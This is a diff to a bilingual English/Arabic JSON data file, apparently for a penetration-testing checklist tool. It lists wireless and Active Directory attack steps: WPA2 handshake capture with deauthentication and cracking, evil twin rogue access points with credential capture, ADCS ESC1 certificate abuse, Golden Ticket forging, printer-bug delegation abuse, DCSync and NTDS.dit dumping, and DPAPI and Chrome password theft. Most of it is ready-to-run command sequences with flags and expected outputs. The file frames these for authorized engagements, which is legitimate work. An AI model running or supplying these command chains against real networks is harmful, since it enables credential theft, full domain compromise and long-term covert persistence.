+            "cmd": "# Start targeted capture (separate terminal):\nairodump-ng -c {CHANNEL} --bssid {TARGET_BSSID} -w {HANDSHAKE_FILE} {INTERFACE}mon\n\n# Deauthenticate a client to force reconnect:\naireplay-ng -0 5 -a {TARGET_BSSID} -c {CLIENT_MAC} {INTERFACE}mon\n# -0 5 = send 5 deauth frames (enough to force reconnect)\n\n# Verify handshake captured:\naircrack-ng {HANDSHAKE_FILE}-01.cap\n# Look for: KEY FOUND! or just handshake confirmation\n\n# Crack:\nhashcat -m 22000 {HANDSHAKE_FILE}.hc22000 /usr/share/wordlists/rockyou.txt",
+            "example": "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon",
+            "flags": [
+              {
+                "f": "-0",
+                "d": {
+                  "en": "Deauthentication attack",
+                  "ar": "هجوم إلغاء المصادقة"
+                }
+              },
+              {
+                "f": "-a",
+                "d": {
+                  "en": "Target AP BSSID",
+                  "ar": "BSSID لـAP المستهدف"
+                }
+              },
+              {
+                "f": "-c",
+                "d": {
+                  "en": "Target client MAC (omit for broadcast deauth — noisier)",
+                  "ar": "MAC للعميل المستهدف (احذفه لـdeauth البث — أكثر ضجيجاً)"
+                }
+              }
+            ],
+            "note": {
+              "en": "Document deauth attacks in your scope authorization. They briefly disconnect legitimate users — get explicit written approval before running.",
+              "ar": "وثّق هجمات Deauth في تفويض النطاق. إنها تقطع المستخدمين الشرعيين مؤقتاً — احصل على موافقة كتابية صريحة قبل التشغيل."
+            },
+            "out": {
+              "en": "Captured 4-way handshake file + cracked PSK",
+              "ar": "ملف 4-Way Handshake ملتقط + WPA2 PSK مكسورة"
+            }
+          }
+        ],
+        "tools": [
+          "aircrack-ng",
+          "hcxdumptool",
+          "hcxtools",
+          "hashcat",
+          "Alfa adapter"
+        ],
+        "deliverable": {
+          "en": "Cracked WPA2 passphrase with crack time and methodology documented",
+          "ar": "WPA2 passphrase مكسورة مع توثيق وقت الكسر والمنهجية"
+        },
+        "tip": {
+          "en": "Build a company-specific wordlist first: company name, city, year, product names, variations with numbers/symbols. Corporate PSKs almost never use random strings.",
+          "ar": "ابنِ قائمة كلمات مرور خاصة بالشركة أولاً: اسم الشركة، المدينة، السنة، أسماء المنتجات، التنوعات بأرقام/رموز. PSKs الشركات تكاد لا تستخدم سلاسل عشوائية."
+        }
+      },
+      {
+        "id": "wl3",
+        "title": {
+          "en": "Evil Twin & Rogue AP",
+          "ar": "Evil Twin ونقطة وصول مارقة"
+        },
+        "priority": "high",
+        "summary": {
+          "en": "Create a rogue access point that mimics the target to capture credentials or perform MitM.",
+          "ar": "إنشاء نقطة وصول مارقة تحاكي الهدف لالتقاط بيانات الاعتماد أو تنفيذ هجوم MitM."
+        },
+        "checklist": [
+          {
+            "en": "Create evil twin with same SSID as target",
+            "ar": "إنشاء Evil Twin بنفس SSID المستهدف"
+          },
+          {
+            "en": "Deauth clients from legitimate AP to force them to your rogue AP",
+            "ar": "إلغاء مصادقة العملاء من AP الشرعي لإجبارهم على AP المارق"
+          },
+          {
+            "en": "Set up captive portal for credential capture (WPA2-Enterprise GT downgrade)",
+            "ar": "إعداد Captive Portal لالتقاط بيانات الاعتماد (هبوط GTC لـWPA2-Enterprise)"
+          },
+          {
+            "en": "Configure hostapd-wpe for EAP credential capture (802.1X environments)",
+            "ar": "تهيئة hostapd-wpe لالتقاط بيانات اعتماد EAP (بيئات 802.1X)"
+          },
+          {
+            "en": "Run Responder on the rogue network to capture NTLM hashes",
+            "ar": "تشغيل Responder على الشبكة المارقة لالتقاط هاشات NTLM"
+          },
+          {
+            "en": "DNS spoof key internal domains once clients connect",
+            "ar": "DNS Spoof للنطاقات الداخلية الرئيسية بمجرد اتصال العملاء"
+          },
+          {
+            "en": "Document all captured credentials for report",
+            "ar": "توثيق جميع بيانات الاعتماد الملتقطة للتقرير"
+          }
+        ],
+        "commands": [
+          {
+            "id": "wl3c1",
+            "title": {
+              "en": "Evil Twin with hostapd-wpe (Enterprise)",
+              "ar": "Evil Twin مع hostapd-wpe (Enterprise)"
+            },
+            "purpose": {
+              "en": "Rogue AP for WPA2-Enterprise networks — captures EAP credentials",
+              "ar": "AP مارق لشبكات WPA2-Enterprise — يلتقط بيانات اعتماد EAP"
+            },
+            "cmd": "# Install:\napt install hostapd-wpe -y\n\n# Configure /etc/hostapd-wpe/hostapd-wpe.conf:\n# interface=wlan1\n# ssid={TARGET_SSID}\n# channel={TARGET_CHANNEL}\n\n# Start rogue AP:\nhostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf\n\n# Deauth from legitimate AP (wlan0mon in monitor mode):\naireplay-ng -0 0 -a {LEGIT_BSSID} wlan0mon\n\n# Captured credentials appear in terminal:\n# mschapv2: identity, challenge, response\n# Crack MSCHAP response:\nasleap -C {CHALLENGE} -R {RESPONSE} -W /usr/share/wordlists/rockyou.txt",
+            "example": "hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf",
+            "flags": [
+              {
+                "f": "wpe_logfile",
+                "d": {
+                  "en": "Log captured credentials to file",
+                  "ar": "تسجيل بيانات الاعتماد الملتقطة في ملف"
+                }
+              },
+              {
+                "f": "eap_user_file",
+                "d": {
+                  "en": "Accepted EAP methods — list GTC to force cleartext credential submission",
+                  "ar": "طرق EAP المقبولة — أضف GTC لإجبار إرسال بيانات الاعتماد نصاً صريحاً"
+                }
+              },
+              {
+                "f": "asleap -C -R -W",
+                "d": {
+                  "en": "Crack captured MSCHAPv2 challenge/response offline",
+                  "ar": "كسر challenge/response من MSCHAPv2 الملتقط بدون اتصال"
+                }
+              }
+            ],
+            "note": {
+              "en": "GTC downgrade is the most effective: if you accept GTC (Generic Token Card) in your rogue EAP server, Windows will send credentials in cleartext when connected to your AP.",
+              "ar": "هبوط GTC هو الأكثر فعالية: إن قبلت GTC (Generic Token Card) في خادم EAP المارق، Windows سيرسل بيانات الاعتماد نصاً صريحاً عند الاتصال بـAP."
+            },
+            "out": {
+              "en": "Cleartext credentials or crackable MSCHAPv2 hashes from WPA2-Enterprise clients",
+              "ar": "بيانات اعتماد نصية صريحة أو هاشات MSCHAPv2 قابلة للكسر من عملاء WPA2-Enterprise"
+            }
+          }
+        ],
+        "tools": [
+          "hostapd-wpe",
+          "aircrack-ng",
+          "Responder",
+          "asleap"
+        ],
+        "deliverable": {
+          "en": "Captured credentials + MitM traffic sample + network access proof",
+          "ar": "بيانات اعتماد ملتقطة + عينة حركة MitM + دليل وصول للشبكة"
+        },
+        "tip": {
+          "en": "Evil twin attacks require two wireless adapters: one in monitor mode for deauth, one as the rogue AP. A single adapter cannot reliably do both simultaneously.",
+          "ar": "هجمات Evil Twin تتطلب محوّلَي شبكة لاسلكية: أحدهما في وضع المراقبة للـdeauth والآخر كنقطة وصول مارقة. محوّل واحد لا يستطيع تنفيذ الاثنين بشكل موثوق في آنٍ واحد."
+        }
+      }
+    ]
+  },
+  {
+    "id": "adv_ad",
+    "label": {
+      "en": "AD — Advanced",
+      "ar": "Active Directory — متقدم"
+    },
+    "short": {
+      "en": "AD Adv.",
+      "ar": "AD متقدم"
+    },
+    "icon": "🏰",
+    "color": "#dc2626",
+    "desc": {
+      "en": "ADCS abuse (ESC1-ESC8), Kerberos delegation, Golden/Silver tickets, advanced lateral movement",
+      "ar": "ADCS (ESC1-ESC8)، Kerberos، Golden/Silver Tickets، حركة جانبية متقدمة"
+    },
+    "steps": [
+      {
+        "id": "adv1",
+        "title": {
+          "en": "Active Directory Certificate Services (ADCS)",
+          "ar": "Active Directory Certificate Services (ADCS)"
+        },
+        "priority": "critical",
+        "summary": {
+          "en": "ADCS misconfigurations (ESC1-ESC8) are the most impactful AD vulnerabilities discovered in the last 5 years. Check every AD environment.",
+          "ar": "إعدادات ADCS الخاطئة (ESC1-ESC8) هي أكثر ثغرات AD تأثيراً مكتشفة خلال آخر 5 سنوات. افحص كل بيئة AD."
+        },
+        "checklist": [
+          {
+            "en": "Enumerate ADCS with Certify or certipy",
+            "ar": "حصر ADCS مع Certify أو certipy"
+          },
+          {
+            "en": "ESC1: Certificate template allows SAN specification by enrollee",
+            "ar": "ESC1: قالب شهادة يسمح للمسجِّل بتحديد SAN"
+          },
+          {
+            "en": "ESC2: Any Purpose certificate template",
+            "ar": "ESC2: قالب شهادة لأي غرض"
+          },
+          {
+            "en": "ESC3: Enrollment agent template + any-purpose template chain",
+            "ar": "ESC3: قالب وكيل التسجيل + سلسلة قالب لأي غرض"
+          },
+          {
+            "en": "ESC4: Vulnerable ACLs on certificate template (write access)",
+            "ar": "ESC4: ACLs ضعيفة على قالب الشهادة (وصول للكتابة)"
+          },
+          {
+            "en": "ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag set on CA",
+            "ar": "ESC6: علامة EDITF_ATTRIBUTESUBJECTALTNAME2 مُفعَّلة على CA"
+          },
+          {
+            "en": "ESC7: Vulnerable CA ACLs (ManageCA, ManageCertificates)",
+            "ar": "ESC7: ACLs CA ضعيفة (ManageCA، ManageCertificates)"
+          },
+          {
+            "en": "ESC8: NTLM relay to AD CS web enrollment",
+            "ar": "ESC8: NTLM Relay إلى تسجيل ويب AD CS"
+          },
+          {
+            "en": "Request certificate for Domain Admin if ESC1 found",
+            "ar": "طلب شهادة لـDomain Admin إن وُجد ESC1"
+          },
+          {
+            "en": "Pass-the-Certificate to get Kerberos TGT as Domain Admin",
+            "ar": "Pass-the-Certificate للحصول على Kerberos TGT كـDomain Admin"
+          }
+        ],
+        "commands": [
+          {
+            "id": "adv1c1",
+            "title": {
+              "en": "ADCS Enumeration with Certipy",
+              "ar": "حصر ADCS مع Certipy"
+            },
+            "purpose": {
+              "en": "Find all ADCS certificate template misconfigurations in one scan",
+              "ar": "إيجاد كل إعدادات قوالب شهادات ADCS الخاطئة في فحص واحد"
+            },
+            "cmd": "# Install:\npip3 install certipy-ad\n\n# Full enumeration (generates .zip + .json output):\ncertipy find -u '{USER}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -stdout\n\n# Filter to vulnerable templates only:\ncertipy find -u '{USER}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout\n\n# ESC1 exploitation — request cert as Domain Admin:\ncertipy req -u '{USER}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} \\\n  -target {CA_SERVER} -ca '{CA_NAME}' \\\n  -template '{VULNERABLE_TEMPLATE}' \\\n  -upn 'administrator@{DOMAIN}'",
+            "example": "certipy find -u john@acme.local -p Pass123 -dc-ip 10.0.0.1 -vulnerable -stdout",
+            "flags": [
+              {
+                "f": "-vulnerable",
+                "d": {
+                  "en": "Only show vulnerable templates (reduces noise)",
+                  "ar": "إظهار القوالب الضعيفة فقط (يقلل الضوضاء)"
+                }
+              },
+              {
+                "f": "-upn",
+                "d": {
+                  "en": "ESC1: Set alternate UPN — specify any user including Domain Admin",
+                  "ar": "ESC1: تعيين UPN بديل — حدد أي مستخدم بما فيهم Domain Admin"
+                }
+              },
+              {
+                "f": "-template",
+                "d": {
+                  "en": "Specify the vulnerable template name to use",
+                  "ar": "تحديد اسم القالب الضعيف للاستخدام"
+                }
+              }
+            ],
+            "note": {
+              "en": "ESC1 is game over for a domain if found. You request a certificate for administrator@domain, then use it to get a TGT as DA. No password needed for the DA account.",
+              "ar": "ESC1 = خسارة كاملة للنطاق إن وُجدت. تطلب شهادة لـadministrator@domain، ثم تستخدمها للحصول على TGT كـDA. لا حاجة لكلمة مرور حساب DA."
+            },
+            "out": {
+              "en": "List of vulnerable certificate templates with ESC category and exploitation steps",
+              "ar": "قائمة قوالب الشهادات الضعيفة مع فئة ESC وخطوات الاستغلال"
+            }
+          },
+          {
+            "id": "adv1c2",
+            "title": {
+              "en": "Pass-the-Certificate to Domain Admin",
+              "ar": "Pass-the-Certificate إلى Domain Admin"
+            },
+            "purpose": {
+              "en": "Use an ADCS-obtained certificate to authenticate as Domain Admin",
+              "ar": "استخدام شهادة مستخرجة من ADCS للمصادقة كـDomain Admin"
+            },
+            "cmd": "# After obtaining cert via ESC1 (previous step):\n# .pfx file contains the certificate + private key\n\n# Get TGT using certificate (Kerberos PKINIT):\ncertipy auth -pfx administrator.pfx -dc-ip {DC_IP}\n# This outputs: TGT ccache file + NT hash of administrator\n\n# Use the NT hash directly (pass-the-hash):\nimpacket-secretsdump -hashes :{NT_HASH} administrator@{DC_IP}\n\n# OR use the ccache:\nexport KRB5CCNAME=administrator.ccache\nimpacket-psexec -k -no-pass {DC_FQDN}",
+            "example": "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1",
+            "flags": [
+              {
+                "f": "-pfx",
+                "d": {
+                  "en": "Certificate + private key file from ADCS exploitation",
+                  "ar": "ملف الشهادة + المفتاح الخاص من استغلال ADCS"
+                }
+              },
+              {
+                "f": "export KRB5CCNAME",
+                "d": {
+                  "en": "Set environment variable for Kerberos ticket — required for -k flag in impacket",
+                  "ar": "تعيين متغير البيئة لتذكرة Kerberos — مطلوب لعلامة -k في impacket"
+                }
+              }
+            ],
+            "note": {
+              "en": "This gives you the DA NT hash WITHOUT knowing DA password. Hash is valid until the account's password changes.",
+              "ar": "هذا يمنحك هاش DA NTLM دون معرفة كلمة مرور DA. الهاش صالح حتى تتغير كلمة مرور الحساب."
+            },
+            "out": {
+              "en": "Domain Admin NT hash + Kerberos TGT + full domain compromise",
+              "ar": "هاش Domain Admin NTLM + Kerberos TGT + اختراق كامل للنطاق"
+            }
+          }
+        ],
+        "tools": [
+          "certipy-ad",
+          "impacket",
+          "Certify (Windows)"
+        ],
+        "deliverable": {
+          "en": "ADCS vulnerability report with ESC categories + Domain Admin compromise proof",
+          "ar": "تقرير ثغرات ADCS مع فئات ESC + دليل اختراق Domain Admin"
+        },
+        "tip": {
+          "en": "Every AD environment with ADCS installed should be checked. ESC1 is present in ~60% of engagements — it's the default configuration for many common certificate templates.",
+          "ar": "ESC1 موجودة في ~60% من المهام — إنها التهيئة الافتراضية لكثير من قوالب الشهادات الشائعة."
+        }
+      },
+      {
+        "id": "adv2",
+        "title": {
+          "en": "Kerberos Advanced Attacks",
+          "ar": "هجمات Kerberos المتقدمة"
+        },
+        "priority": "critical",
+        "summary": {
+          "en": "Golden tickets, Silver tickets, and delegation abuse — full persistence and cross-trust lateral movement.",
+          "ar": "Golden Tickets وSilver Tickets وإساءة استخدام التفويض — استمرارية كاملة وحركة جانبية عبر الثقات."
+        },
+        "checklist": [
+          {
+            "en": "Enumerate unconstrained delegation hosts (except DCs)",
+            "ar": "حصر مضيفي التفويض غير المقيّد (ما عدا DCs)"
+          },
+          {
+            "en": "Enumerate constrained delegation service accounts",
+            "ar": "حصر حسابات خدمة التفويض المقيّد"
+          },
+          {
+            "en": "Check for resource-based constrained delegation misconfiguration",
+            "ar": "فحص إعداد التفويض المقيّد القائم على الموارد الخاطئ"
+          },
+          {
+            "en": "Obtain krbtgt hash for Golden Ticket (if DA or DCSync access achieved)",
+            "ar": "الحصول على هاش krbtgt لـGolden Ticket (إن تحقق وصول DA أو DCSync)"
+          },
+          {
+            "en": "Create Golden Ticket for 10-year persistence",
+            "ar": "إنشاء Golden Ticket للاستمرارية 10 سنوات"
+          },
+          {
+            "en": "Silver Ticket: forge service tickets without communicating with DC",
+            "ar": "Silver Ticket: تزوير تذاكر خدمة دون التواصل مع DC"
+          },
+          {
+            "en": "Unconstrained delegation: coerce DC to authenticate, capture TGT",
+            "ar": "التفويض غير المقيّد: إجبار DC على المصادقة، التقاط TGT"
+          },
+          {
+            "en": "S4U2Self + S4U2Proxy for constrained delegation abuse",
+            "ar": "S4U2Self + S4U2Proxy لإساءة استخدام التفويض المقيّد"
+          },
+          {
+            "en": "Cross-forest trust ticket attacks if forest trusts present",
+            "ar": "هجمات تذاكر الثقة عبر الغابات إن وُجدت ثقات غابات"
+          }
+        ],
+        "commands": [
+          {
+            "id": "adv2c1",
+            "title": {
+              "en": "Golden Ticket — Domain Persistence",
+              "ar": "Golden Ticket — استمرارية النطاق"
+            },
+            "purpose": {
+              "en": "Forge Kerberos TGTs using krbtgt hash — valid even after password resets (except krbtgt itself)",
+              "ar": "تزوير Kerberos TGTs باستخدام هاش krbtgt — صالح حتى بعد إعادة تعيين كلمات المرور"
+            },
+            "cmd": "# Requires DA or DCSync access first to get krbtgt hash:\nimpacket-secretsdump -hashes :{DA_NT_HASH} '{DOMAIN}/administrator@{DC_IP}'\n# Note: krbtgt hash from output above\n\n# Create Golden Ticket with Impacket:\nimpacket-ticketer -nthash {KRBTGT_HASH} \\\n  -domain-sid {DOMAIN_SID} \\\n  -domain {DOMAIN} \\\n  -groups 512,513,518,519,520 \\\n  -user-id 500 \\\n  administrator\n\n# Use the Golden Ticket:\nexport KRB5CCNAME=administrator.ccache\nimpacket-psexec -k -no-pass {TARGET_FQDN}\n\n# Mimikatz (on Windows):\n# kerberos::golden /user:Administrator /domain:{DOMAIN} /sid:{DOMAIN_SID} /krbtgt:{HASH} /id:500 /ptt",
+            "example": "impacket-ticketer -nthash {KRBTGT_HASH} -domain-sid S-1-5-21-... -domain acme.local administrator",
+            "flags": [
+              {
+                "f": "-groups 512,513,518,519,520",
+                "d": {
+                  "en": "Domain Admins, Domain Users, Schema Admins, Enterprise Admins, Group Policy Creator Owners",
+                  "ar": "Domain Admins، Domain Users، Schema Admins، Enterprise Admins، Group Policy Creator Owners"
+                }
+              },
+              {
+                "f": "-user-id 500",
+                "d": {
+                  "en": "RID 500 = built-in Administrator account",
+                  "ar": "RID 500 = حساب Administrator المدمج"
+                }
+              },
+              {
+                "f": "/ptt",
+                "d": {
+                  "en": "Mimikatz: inject ticket directly into current session (no file)",
+                  "ar": "Mimikatz: حقن التذكرة مباشرة في الجلسة الحالية (دون ملف)"
+                }
+              }
+            ],
+            "note": {
+              "en": "Golden Tickets survive krbtgt password reset ONCE. Microsoft's recommendation is to reset krbtgt password TWICE to invalidate all existing forged tickets.",
+              "ar": "Golden Tickets تنجو من إعادة تعيين كلمة مرور krbtgt مرة واحدة. توصية مايكروسوفت هي إعادة التعيين مرتين لإلغاء كل التذاكر المزوَّرة الموجودة."
+            },
+            "out": {
+              "en": "Persistent DA access valid for 10 years, survivable across most incident response actions",
+              "ar": "وصول DA مستمر صالح 10 سنوات، قابل للبقاء عبر معظم إجراءات الاستجابة للحوادث"
+            }
+          },
+          {
+            "id": "adv2c2",
+            "title": {
+              "en": "Unconstrained Delegation + Printer Bug",
+              "ar": "التفويض غير المقيّد + Printer Bug"
+            },
+            "purpose": {
+              "en": "Coerce DC to authenticate to a machine with unconstrained delegation, steal TGT",
+              "ar": "إجبار DC على المصادقة لجهاز بتفويض غير مقيّد، سرقة TGT"
+            },
+            "cmd": "# Find unconstrained delegation hosts (not DCs):\nimpacket-findDelegation -dc-ip {DC_IP} '{DOMAIN}/{USER}:{PASSWORD}'\n# OR BloodHound: MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name\n\n# On the unconstrained delegation machine — run Rubeus to monitor for incoming TGTs:\nRubeus.exe monitor /interval:5 /nowrap\n\n# Trigger DC authentication to delegation host (MS-RPRN 'Printer Bug'):\nimpacket-printerbug -hashes :{USER_HASH} '{DOMAIN}/{USER}@{DC_FQDN}' {DELEGATION_HOST_FQDN}\n\n# Extract TGT from Rubeus output:\nRubeus.exe ptt /ticket:{BASE64_TICKET}\n\n# DCSync with stolen DC TGT:\nimpacket-secretsdump -k -no-pass {DOMAIN}/{DC_HOSTNAME}\\$@{DC_IP}",
+            "example": "impacket-printerbug -hashes :NT_HASH 'acme.local/user@dc01.acme.local' deleghost01.acme.local",
+            "flags": [
+              {
+                "f": "monitor /interval:5",
+                "d": {
+                  "en": "Rubeus: watch for new TGTs arriving every 5 seconds",
+                  "ar": "Rubeus: مراقبة وصول TGTs جديدة كل 5 ثوانٍ"
+                }
+              },
+              {
+                "f": "printerbug",
+                "d": {
+                  "en": "Uses MS-RPRN to force DC computer account to authenticate outbound",
+                  "ar": "يستخدم MS-RPRN لإجبار حساب آلة DC على المصادقة للخارج"
+                }
+              }
+            ],
+            "note": {
+              "en": "The 'Printer Bug' (SpoolSample/printerbug) works on any Windows host with Print Spooler running — which is most DCs. DC authenticates as its MACHINE account, giving you DC machine TGT = DCSync capability.",
+              "ar": "\"Printer Bug\" (SpoolSample/printerbug) يعمل على أي جهاز Windows يشغّل Print Spooler — وهو معظم DCs. DC يُصادق كحساب MACHINE الخاص به، مما يمنحك TGT لآلة DC = قدرة DCSync."
+            },
+            "out": {
+              "en": "Domain Controller machine account TGT → DCSync → all domain hashes",
+              "ar": "TGT لحساب آلة Domain Controller → DCSync → كل هاشات النطاق"
+            }
+          }
+        ],
+        "tools": [
+          "impacket",
+          "Rubeus",
+          "mimikatz",
+          "certipy-ad"
+        ],
+        "deliverable": {
+          "en": "Golden Ticket persistence proof + Kerberos attack chain documentation",
+          "ar": "دليل استمرارية Golden Ticket + توثيق سلسلة هجوم Kerberos"
+        },
+        "tip": {
+          "en": "Always check for Print Spooler running on DCs: sc qc spooler on the DC. Microsoft released patches but many DCs still run it. One of the highest-value, most reliable paths in AD testing.",
+          "ar": "تحقق دائماً من تشغيل Print Spooler على DCs: sc qc spooler على DC. مايكروسوفت أصدرت تصحيحات لكن كثيراً من DCs لا تزال تشغّله. أحد أعلى المسارات قيمةً وأكثرها موثوقيةً في اختبار AD."
+        }
+      },
+      {
+        "id": "adv3",
+        "title": {
+          "en": "NTDS.dit Offline & DPAPI Secrets",
+          "ar": "NTDS.dit بدون اتصال وأسرار DPAPI"
+        },
+        "priority": "high",
+        "summary": {
+          "en": "Extract the complete domain credential database and DPAPI-protected secrets from member machines.",
+          "ar": "استخراج قاعدة بيانات بيانات اعتماد النطاق الكاملة والأسرار المحمية بـDPAPI من الأجهزة العضو."
+        },
+        "checklist": [
+          {
+            "en": "DCSync to extract all domain hashes remotely (preferred — no file needed)",
+            "ar": "DCSync لاستخراج جميع هاشات النطاق عن بُعد (مُفضَّل — لا حاجة لملف)"
+          },
+          {
+            "en": "VSS shadow copy method to copy NTDS.dit offline",
+            "ar": "طريقة VSS Shadow Copy لنسخ NTDS.dit بدون اتصال"
+          },
+          {
+            "en": "Crack all extracted hashes with hashcat",
+            "ar": "كسر جميع الهاشات المستخرجة مع hashcat"
+          },
+          {
+            "en": "Identify DPAPI master key locations on member machines",
+            "ar": "تحديد مواقع DPAPI Master Key على الأجهزة العضو"
+          },
+          {
+            "en": "Extract DPAPI-protected credentials: browser passwords, WiFi keys, RDP saved creds",
+            "ar": "استخراج بيانات الاعتماد المحمية بـDPAPI: كلمات مرور المتصفح، مفاتيح WiFi، بيانات اعتماد RDP المحفوظة"
+          },
+          {
+            "en": "Check for DPAPI domain backup key (golden key — decrypts all domain DPAPI blobs)",
+            "ar": "فحص DPAPI Domain Backup Key (المفتاح الذهبي — يفك تشفير كل كتل DPAPI في النطاق)"
+          },
+          {
+            "en": "Extract credential manager (Windows Vault) secrets",
+            "ar": "استخراج أسرار Credential Manager (Windows Vault)"
+          },
+          {
+            "en": "Search for clear-text credentials in SYSVOL Group Policy Preferences",
+            "ar": "البحث عن كلمات مرور نصية في SYSVOL Group Policy Preferences"
+          }
+        ],
+        "commands": [
+          {
+            "id": "adv3c1",
+            "title": {
+              "en": "DCSync + NTDS.dit Complete Extraction",
+              "ar": "DCSync + الاستخراج الكامل لـNTDS.dit"
+            },
+            "purpose": {
+              "en": "Extract every credential in the domain — current and historical",
+              "ar": "استخراج كل بيانات اعتماد في النطاق — الحالية والتاريخية"
+            },
+            "cmd": "# Remote DCSync (preferred — runs over network, no files on DC):\nimpacket-secretsdump -hashes :{DA_HASH} '{DOMAIN}/administrator@{DC_IP}' \\\n  -just-dc -outputfile {CLIENT}_ntds\n# Outputs: .ntds (hashes), .ntds.cleartext (if reversible enc), .ntds.kerberos\n\n# VSS method (if DCSync fails due to AV/EDR):\n# On DC as SYSTEM:\nvssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM\n# Then exfil and extract locally:\nimpacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL",
+            "example": "impacket-secretsdump -hashes :DA_HASH 'acme.local/administrator@10.0.0.1' -just-dc -outputfile acme_ntds",
+            "flags": [
+              {
+                "f": "-just-dc",
+                "d": {
+                  "en": "Extract only domain credentials (faster, less noise)",
+                  "ar": "استخراج بيانات اعتماد النطاق فقط (أسرع، أقل ضجيجاً)"
+                }
+              },
+              {
+                "f": "-just-dc-user",
+                "d": {
+                  "en": "Extract single user (stealthy for targeted extraction)",
+                  "ar": "استخراج مستخدم واحد (تخفٍّ للاستخراج المُستهدف)"
+                }
+              },
+              {
+                "f": "LOCAL",
+                "d": {
+                  "en": "Offline mode — parse ntds.dit + SYSTEM hive from files",
+                  "ar": "وضع بدون اتصال — تحليل ntds.dit + SYSTEM hive من ملفات"
+                }
+              }
+            ],
+            "note": {
+              "en": "DCSync generates 4625/4662 events if DC auditing is enabled. -just-dc-user for targeted extractions. Full -just-dc at the END of your engagement window.",
+              "ar": "DCSync يولّد أحداث 4625/4662 إن كان التدقيق مُفعَّلاً على DC. استخدم -just-dc-user للاستخراج المُستهدف. DCSync الكامل في نهاية نافذة مهمتك."
+            },
+            "out": {
+              "en": "Complete NTDS.dit: all user hashes, Kerberos keys, historical passwords",
+              "ar": "NTDS.dit كامل: كل هاشات المستخدمين، مفاتيح Kerberos، كلمات المرور التاريخية"
+            }
+          },
+          {
+            "id": "adv3c2",
+            "title": {
+              "en": "DPAPI Secrets & Group Policy Preferences",
+              "ar": "أسرار DPAPI وGroup Policy Preferences"
+            },
+            "purpose": {
+              "en": "Extract browser passwords, WiFi keys, and credentials from SYSVOL",
+              "ar": "استخراج كلمات مرور المتصفح، مفاتيح WiFi، وبيانات الاعتماد من SYSVOL"
+            },
+            "cmd": "# DPAPI via impacket (domain user + domain backup key):\nimpacket-dpapi backupkeys --export -t '{DOMAIN}/{USER}:{PASSWORD}@{DC_IP}'\n# This gets the domain DPAPI backup key — decrypts ALL DPAPI blobs on all machines\n\n# Chrome passwords via SharpDPAPI (Windows, run as user):\nSharpDPAPI.exe triage\nSharpChrome.exe logins\n\n# Via impacket remotely:\nimpacket-dpapi masterkey -file '/path/to/masterkey' \\\n  -pvk domain_backup.pvk\n\n# GPP Passwords in SYSVOL (classic finding — should still be checked):\nGet-ChildItem -Path \\\\{DOMAIN}\\SYSVOL -Recurse -ErrorAction SilentlyContinue | \\\n  Select-String -Pattern 'cpassword' | Select-Object -ExpandProperty Path\n# Decrypt cpassword:\ngpp-decrypt {CPASSWORD_VALUE}",
+            "example": "impacket-dpapi backupkeys --export -t 'acme.local/admin:Pass123@10.0.0.1'",
+            "flags": [
+              {
+                "f": "backupkeys --export",
+                "d": {
+                  "en": "Get the domain DPAPI backup master key — decrypts everything",
+                  "ar": "الحصول على مفتاح النسخ الاحتياطي الرئيسي لـDPAPI — يفك تشفير كل شيء"
+                }
+              },
+              {
+                "f": "gpp-decrypt",
+                "d": {
+                  "en": "Kali built-in: decrypt Group Policy Preferences cpassword (AES key published by Microsoft in 2012)",
+                  "ar": "مدمج في Kali: فك تشفير cpassword من Group Policy Preferences (مفتاح AES نشرته مايكروسوفت في 2012)"
+                }
+              },
+              {
+                "f": "SharpChrome.exe logins",
+                "d": {
+                  "en": "Extract Chrome saved passwords for current user",
+                  "ar": "استخراج كلمات مرور Chrome المحفوظة للمستخدم الحالي"
+                }
+              }
+            ],
+            "note": {
+              "en": "GPP cpassword was patched in MS14-025 but SYSVOL blobs persist forever. Still found in old Group Policy Objects in 30% of AD environments — always check.",
+              "ar": "كلمة مرور GPP تم تصحيحها في MS14-025 لكن كتل SYSVOL تبقى للأبد. لا تزال موجودة في كائنات Group Policy القديمة في 30% من بيئات AD — تحقق منها دائماً."
+            },
+            "out": {
+              "en": "Browser passwords, WiFi PSKs, service account credentials, historical GPP passwords",
+              "ar": "كلمات مرور المتصفح، مفاتيح PSK للـWiFi، بيانات اعتماد حسابات الخدمة، كلمات مرور GPP التاريخية"
+            }
+          }
+        ],
+        "tools": [
+          "impacket",
+          "SharpDPAPI",
+          "mimikatz",
+          "gpp-decrypt"
+        ],
+        "deliverable": {
+          "en": "Complete domain credential dump + DPAPI secrets + all privilege escalation paths documented",
+          "ar": "تفريغ كامل لبيانات اعتماد النطاق + أسرار DPAPI + كل مسارات تصعيد الصلاحيات موثَّقة"
+        },
+        "tip": {
+          "en": "The DPAPI domain backup key never changes and decrypts every DPAPI blob ever created in the domain — past and future. Getting it is equivalent to having every credential the domain has ever protected.",
+          "ar": "مفتاح النسخ الاحتياطي لـDPAPI لا يتغير أبداً ويفك تشفير كل كتلة DPAPI أنشئت في النطاق — ماضياً ومستقبلاً. الحصول عليه يعادل امتلاك كل بيانات اعتماد حماها النطاق على الإطلاق."
+        }
+      }
+    ]
   }
 ]
